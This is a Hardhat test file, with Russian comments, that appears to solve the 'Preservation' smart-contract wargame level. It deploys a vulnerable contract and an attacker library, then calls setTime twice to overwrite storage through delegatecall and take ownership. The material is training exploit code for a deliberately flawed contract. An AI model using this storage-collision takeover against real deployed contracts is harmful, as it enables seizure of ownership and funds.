const { expect } = require("chai");
const {
  loadFixture,
} = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { ethers } = require("hardhat");

describe("TimeZone", function () {
  async function deployFixture() {
    const [player, owner] = await ethers.getSigners();

    const LibraryContract = await ethers.deployContract("LibraryContract");
    await LibraryContract.waitForDeployment();
    const LibraryContractAddr = LibraryContract.target;
    console.log("Адрес библиотечного контракта:", LibraryContractAddr);

    const Preservation = await ethers.deployContract("Preservation", [
      LibraryContractAddr,
      owner,
    ]);
    await Preservation.waitForDeployment();
    const PreservationAddr = Preservation.target;
    console.log("Адрес основного контракта:", PreservationAddr);

    console.log("Адрес владельца:", owner.address);
    console.log("Адрес атакующего владельца:", player.address);

    return { Preservation, player };
  }

  async function deployMyAttackLibrary() {
    const AttackLibrary = await ethers.deployContract("LibraryContractDrop")
    await AttackLibrary.waitForDeployment()
    const AttackLibraryAddr = AttackLibrary.target;
    console.log("Адрес атакующего контракта:", AttackLibraryAddr);

    return AttackLibrary
  }

  it("hack", async function () {
    const { Preservation, player } = await loadFixture(deployFixture);
    const AttackLibrary = await deployMyAttackLibrary()

    await Preservation.setTime(AttackLibrary.target)
    await Preservation.setTime(player.address)

    // напишите свой контракт и тесты, чтобы получить нужное состояние контракта

    // теперь владелец контракта player, а не owner
    expect(await Preservation.owner()).to.equal(player);
  });
});
